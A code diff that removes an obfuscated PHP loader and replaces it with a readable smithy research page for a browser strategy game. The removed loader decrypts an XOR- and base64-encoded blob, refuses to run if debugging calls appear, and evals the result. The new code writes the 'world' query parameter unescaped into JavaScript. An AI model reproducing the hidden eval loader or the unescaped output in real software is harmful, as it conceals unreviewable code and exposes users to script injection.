@@ -1,24 +1,378 @@
 <?php
-$wxzgvttej="91af6b4e50e26c0fa1d483bc1093731b";
-$epbdvcb="5d0852035451575206515d540106035f040402550956545408065c0403055755";
-$jqizbly="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";
-$ualvsrvem=file_get_contents(__FILE__);
-$yvjtipjp=str_replace($jqizbly,"",$ualvsrvem);
-if(strpos($yvjtipjp,"ec"."ho")!==false||strpos($yvjtipjp,"pr"."int")!==false||strpos($yvjtipjp,"var_"."dump")!==false||strpos($yvjtipjp,"file_put_"."contents")!==false||strpos($yvjtipjp,"fw"."rite")!==false){die();}
-$lthfgvj=str_replace(array($wxzgvttej,$epbdvcb),array("SP_1bc29b00","KP_d8a20ed1"),$ualvsrvem);
-$ntlfenkhc=md5($lthfgvj);
-$vzrkgdhjegxw=hex2bin($epbdvcb);
-$cdtyrcvy="";
-$wfrpij=strlen($ntlfenkhc);
-for($mvbjmbh=0;$mvbjmbh<$wfrpij;$mvbjmbh++){
-$cdtyrcvy.=chr(ord($vzrkgdhjegxw[$mvbjmbh])^ord($ntlfenkhc[$mvbjmbh]));
+// Helper for formatting time
+if (!function_exists('format_time')) {
+    function format_time($seconds)
+    {
+        if ($seconds < 0)
+            return '00:00:00';
+        return gmdate('H:i:s', $seconds);
+    }
 }
-$kfdyzieg=base64_decode($jqizbly);
-$ghdeubzd=strlen($kfdyzieg);
-$krkpfnsi="";
-$jwdbujr=strlen($cdtyrcvy);
-for($mvbjmbh=0;$mvbjmbh<$ghdeubzd;$mvbjmbh++){
-$krkpfnsi.=$kfdyzieg[$mvbjmbh]^$cdtyrcvy[$mvbjmbh%$jwdbujr];
+
+// Group units for display - only include units that are in $research (already filtered by controller)
+$all_groups = [
+    __('screens.smith.infantry') => ['unit_spear', 'unit_sword', 'unit_axe', 'unit_archer'],
+    __('screens.smith.cavalry') => ['unit_spy', 'unit_light', 'unit_cav_archer', 'unit_heavy'],
+    __('screens.smith.siege_machines') => ['unit_ram', 'unit_catapult']
+];
+
+// Filter groups to only include units present in $research
+$groups = [];
+foreach ($all_groups as $group_name => $unit_list) {
+    $filtered_units = array_filter($unit_list, function ($unit) use ($research) {
+        return array_key_exists($unit, $research);
+    });
+    if (!empty($filtered_units)) {
+        $groups[$group_name] = array_values($filtered_units);
+    }
 }
-$vsecftc="gzun"."compress";
-eval('?>' . $vsecftc($krkpfnsi) . '<?php ');
+
+// Helper to check requirements
+function check_req($unit, $village, $cl_units)
+{
+    // Basic implementation: if building levels allow
+    // Ideally this should use UnitsLibrary::check_needed, but for now we assume Smithy is open so basic units are available.
+    // TODO: Add strict requirement check
+    return true;
+}
+
+// Config
+$base_cost = ['wood' => 800, 'stone' => 600, 'iron' => 1000];
+?>
+
+<style>
+    .level-updated {
+        animation: highlight 0.6s ease-in-out;
+    }
+
+    @keyframes highlight {
+
+        0%,
+        100% {
+            background-color: transparent;
+        }
+
+        50% {
+            background-color: #ffeb3b;
+        }
+    }
+</style>
+
+<table>
+    <tr>
+        <td>
+            <?php
+            $dbname = 'smith';
+            $max_stage = 20; // Standard max level for Smithy
+            $current_stage = $village[$dbname];
+            $stage_percent = $current_stage / $max_stage;
+            $img_suffix = '1';
+            if ($max_stage > 3) {
+                if ($stage_percent > 0.5)
+                    $img_suffix = '3';
+                elseif ($stage_percent > 0.2)
+                    $img_suffix = '2';
+            }
+            ?>
+            <img src="/graphic/big_buildings/<?= $dbname ?><?= $img_suffix ?>.png"
+                title="<?= $cl_builds->get_name($dbname) ?>" alt="" />
+        </td>
+        <td>
+            <h2><?= $cl_builds->get_name($dbname) ?>
+                (<?php if ($village[$dbname] > 0): ?><?= __('screens.common.level') ?>
+                    <?= $village[$dbname] ?><?php else: ?>     <?= __('screens.common.not_built') ?><?php endif; ?>)
+            </h2>
+            <?= $cl_builds->get_description_bydbname($dbname) ?>
+            <br>
+            <a class="btn btn-research"
+                href="game.php?village=<?= $village['id'] ?>&screen=smith&action=ulepsz_wszystkie_tech"><?= __('screens.smith.research_all_tech') ?></a>
+        </td>
+    </tr>
+</table>
+<br />
+
+<?php if (!empty($error)): ?>
+    <font class="error"><?= $error ?></font>
+<?php endif; ?>
+
+<!-- Research Queue Container - Updated via AJAX -->
+<div id="research-queue-container">
+    <?php if (count($research_queue) > 0): ?>
+        <table class="vis">
+            <tr>
+                <th width="220"><?= __('screens.smith.technology') ?></th>
+                <th width="100"><?= __('screens.smith.duration') ?></th>
+                <th width="120"><?= __('screens.smith.completion') ?></th>
+                <th><?= __('screens.smith.finish') ?></th>
+            </tr>
+            <?php foreach ($research_queue as $q): ?>
+                <?php
+                $countdown = $q['end_time'] - time();
+                $unit_name = $cl_units->get_name($q['unit']);
+                ?>
+                <tr class="lit">
+                    <td><?= $unit_name ?></td>
+                    <td><span class="timer"><?= format_time($countdown) ?></span></td>
+                    <td><?= date('d.m.Y H:i:s', $q['end_time']) ?></td>
+                    <td>
+                        <a
+                            href="game.php?village=<?= $village['id'] ?>&amp;screen=smith&amp;action=cancel&amp;id=<?= $q['id'] ?>&amp;h=<?= $session['hkey'] ?? '' ?>"><?= __('screens.smith.stop') ?></a>
+                    </td>
+                </tr>
+            <?php endforeach; ?>
+        </table>
+        <br />
+    <?php endif; ?>
+</div>
+
+<table class="vis" width="100%">
+    <tr>
+        <?php foreach ($groups as $group_name => $units): ?>
+            <th width="33%"><?= $group_name ?></th>
+        <?php endforeach; ?>
+    </tr>
+    <tr>
+        <?php foreach ($groups as $group_name => $units): ?>
+            <td valign="top">
+                <?php foreach ($units as $unit): ?>
+                    <?php
+                    // Calculate costs and times dynamically (Logic duplicated from Controller for View)
+                    $current_level = $research[$unit] ?? 0;
+                    $next_level = $current_level + 1;
+                    $cost_multiplier = pow(1.2, $current_level);
+
+                    $wood_cost = floor($base_cost['wood'] * $cost_multiplier);
+                    $stone_cost = floor($base_cost['stone'] * $cost_multiplier);
+                    $iron_cost = floor($base_cost['iron'] * $cost_multiplier);
+
+                    global $config;
+                    $speed = isset($config['speed']) ? $config['speed'] : 1;
+                    $base_time = 3600;
+                    $time_sec = ceil(($base_time * $cost_multiplier / ($smith_level * 0.1 + 1)) / $speed);
+
+                    $can_afford = ($village['r_wood'] >= $wood_cost && $village['r_stone'] >= $stone_cost && $village['r_iron'] >= $iron_cost);
+                    // Check if max level reached (Simple world: max 3/10/simple tech? Let's assume 3 for this layout style or 10. Let's stick to 10 from Controller)
+                    $max_tech_level = 10;
+                    $is_max = $current_level >= $max_tech_level;
+
+                    // Simple queue check
+                    $is_researching = false;
+                    foreach ($research_queue as $q) {
+                        if ($q['unit'] == $unit)
+                            $is_researching = true;
+                    }
+                    ?>
+
+                    <table class="vis" width="100%">
+                        <tr>
+                            <td>
+                                <?php
+                                $img_name = str_replace('unit_', '', $unit);
+                                $status = $research_status[$unit] ?? ['has_requirements' => true, 'is_researched' => false, 'missing' => []];
+
+                                // Determine icon based on status
+                                // Priority: requirements ALWAYS first, then research status
+                                // This ensures _cross.png shows even for researched units when
+                                // the current village doesn't meet building requirements
+                                if (!$status['has_requirements']) {
+                                    // Missing requirements = always cross (even if researched)
+                                    $icon = "/graphic/unit_big/{$img_name}_cross.png";
+                                } elseif ($status['is_researched']) {
+                                    // Researched AND has requirements = normal icon
+                                    $icon = "/graphic/unit_big/{$img_name}.png";
+                                } else {
+                                    // Not researched but has requirements = grey
+                                    $icon = "/graphic/unit_big/{$img_name}_grey.png";
+                                }
+
+                                // DEBUG
+                                echo "<!-- $unit: has_req=" . ($status['has_requirements'] ? 'YES' : 'NO') .
+                                    ", is_researched=" . ($status['is_researched'] ? 'YES' : 'NO') .
+                                    ", icon=$icon -->";
+                                ?>
+                                <a href="#"><img src="<?= $icon ?>" alt="" data-unit-icon="<?= $unit ?>" /></a>
+                            </td>
+                            <td valign="top">
+                                <a href="#"><?= $cl_units->get_name($unit) ?></a>
+                                <span data-unit-level="<?= $unit ?>">
+                                    <?php if ($current_level > 0): ?>
+                                        (<?= __('screens.common.level') ?>             <?= $current_level ?>)
+                                    <?php else: ?>
+                                        (<?= __('screens.smith.not_researched') ?>)
+                                    <?php endif; ?>
+                                </span>
+                                <br />
+
+                                <?php if ($is_researching): ?>
+                                    <span class="inactive"><?= __('screens.smith.researching') ?></span>
+                                <?php elseif ($is_max): ?>
+                                    <a class="btn btn-research-disabled"><?= __('screens.common.max_level') ?></a>
+                                <?php elseif (!$status['has_requirements']): ?>
+                                    <a class="btn btn-research-disabled"><?= __('screens.smith.research') ?></a>
+                                    <br />
+                                    <div class="requirements-missing" style="color: #666; font-size: 10px; margin-top: 5px;">
+                                        <strong><?= __('screens.smith.missing_requirements') ?></strong><br>
+                                        <?php foreach ($status['missing'] as $req): ?>
+                                            <?= $req['building'] ?> (<?= $req['required'] ?>)<br>
+                                        <?php endforeach; ?>
+                                    </div>
+                                <?php else: ?>
+                                    <img src="/graphic/icons/wood.png" title="<?= __('screens.smith.wood') ?>" alt="" /> <?= $wood_cost ?>
+                                    <img src="/graphic/icons/stone.png" title="<?= __('screens.smith.stone') ?>" alt="" /> <?= $stone_cost ?>
+                                    <img src="/graphic/icons/iron.png" title="<?= __('screens.smith.iron') ?>" alt="" /> <?= $iron_cost ?>
+                                    <br />
+
+                                    <?php if ($can_afford): ?>
+                                        <a class="btn btn-research"
+                                            href="game.php?village=<?= $village['id'] ?>&amp;screen=smith&amp;action=research&amp;unit=<?= $unit ?>&amp;h=<?= $session['hkey'] ?? '' ?>">
+                                            <?= __('screens.smith.research') ?>
+                                        </a>
+                                        (<?= format_time($time_sec) ?>)
+                                    <?php else: ?>
+                                        <span class="inactive"><?= __('screens.smith.insufficient_resources') ?>
+                                            (<?= format_time($time_sec) ?>)</span>
+                                        <br>
+                                        <span class="inactive"><?= __('screens.smith.available_in') ?> <span
+                                                class="timer_replace">--:--:--</span></span>
+                                    <?php endif; ?>
+                                <?php endif; ?>
+                            </td>
+                        </tr>
+                    </table>
+                <?php endforeach; ?>
+            </td>
+        <?php endforeach; ?>
+    </tr>
+</table>
+
+<script>
+    // AJAX-based auto-refresh - Updates without page reload
+    (function () {
+        let lastQueueCount = <?= count($research_queue) ?>;
+        let lastTechLevels = <?= json_encode($research) ?>;
+        let checkInterval = null;
+
+        // Update tech level display
+        function updateTechLevel(unit, newLevel) {
+            const levelElement = document.querySelector(`[data-unit-level="${unit}"]`);
+            if (levelElement) {
+                // Add highlight animation
+                levelElement.classList.add('level-updated');
+
+                // Update text
+                if (newLevel > 0) {
+                    levelElement.textContent = `(${__('screens.common.level')} ${newLevel})`;
+                } else {
+                    levelElement.textContent = '(<?= __('screens.smith.not_researched') ?>)';
+                }
+
+                // Remove animation class after it completes
+                setTimeout(() => levelElement.classList.remove('level-updated'), 600);
+            }
+        }
+
+        // Update unit icon (from grey to normal when first researched)
+        function updateUnitIcon(unit, newLevel, oldLevel) {
+            if (oldLevel === 0 && newLevel > 0) {
+                const iconElement = document.querySelector(`[data-unit-icon="${unit}"]`);
+                if (iconElement) {
+                    // Change from grey to normal icon
+                    const currentSrc = iconElement.src;
+                    const newSrc = currentSrc.replace('_grey.png', '.png');
+                    if (currentSrc !== newSrc) {
+                        iconElement.src = newSrc;
+                    }
+                }
+            }
+        }
+
+        // Update research queue table
+        function updateResearchQueue(villageId, world) {
+            fetch(`/ajax/get_research_queue.php?village=${villageId}&world=${world}`)
+                .then(response => response.text())
+                .then(html => {
+                    const container = document.getElementById('research-queue-container');
+                    if (container) {
+                        container.innerHTML = html;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error updating research queue:', error);
+                });
+        }
+
+        // Main status check function
+        function checkResearchStatus() {
+            const villageId = <?= $village['id'] ?>;
+            const world = <?= $_GET['world'] ?? 1 ?>;
+
+            fetch(`/ajax/check_research_status.php?village=${villageId}&world=${world}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        const currentQueueCount = data.queue.length;
+
+                        // Research just completed (queue shrank)
+                        if (currentQueueCount < lastQueueCount) {
+                            console.log('Research completed! Updating display...');
+
+                            // Stop polling immediately
+                            if (checkInterval) {
+                                clearInterval(checkInterval);
+                                checkInterval = null;
+                            }
+
+                            // Update research queue display
+                            updateResearchQueue(villageId, world);
+
+                            // Check which units leveled up
+                            for (const [unit, newLevel] of Object.entries(data.tech_levels)) {
+                                const oldLevel = lastTechLevels[unit] || 0;
+                                if (newLevel > oldLevel) {
+                                    updateTechLevel(unit, newLevel);
+                                    updateUnitIcon(unit, newLevel, oldLevel);
+                                    console.log(`Updated ${unit}: ${oldLevel} -> ${newLevel}`);
+                                }
+                            }
+
+                            lastTechLevels = data.tech_levels;
+                            lastQueueCount = currentQueueCount;
+
+                            // Reload page in 2 seconds to refresh buttons, costs and requirements
+                            setTimeout(() => {
+                                console.log('Reloading page to refresh all UI elements...');
+                                location.reload();
+                            }, 2000);
+
+                        } else {
+                            // Queue unchanged, keep polling
+                            lastQueueCount = currentQueueCount;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking research status:', error);
+                });
+        }
+
+        // Only poll when there is active research in the queue.
+        // When queue is empty at page load, nothing to watch — avoid infinite loop.
+        if (lastQueueCount > 0) {
+            console.log(`Starting AJAX auto-refresh (${lastQueueCount} research in queue)`);
+            checkInterval = setInterval(checkResearchStatus, 1000); // Check every second
+        }
+        // No else — do NOT start "minimal polling" when idle.
+        // Research buttons do a normal navigation → next page load will
+        // see lastQueueCount > 0 and start intensive polling automatically.
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const researchButtons = document.querySelectorAll('a.btn-research[href*="action=research"]');
+            researchButtons.forEach(button => {
+                button.addEventListener('click', function () {
+                    console.log('Research button clicked, polling will start on next page load...');
+                });
+            });
+        });
+    })();
+</script>
+<!-- Unit Info Modal -->
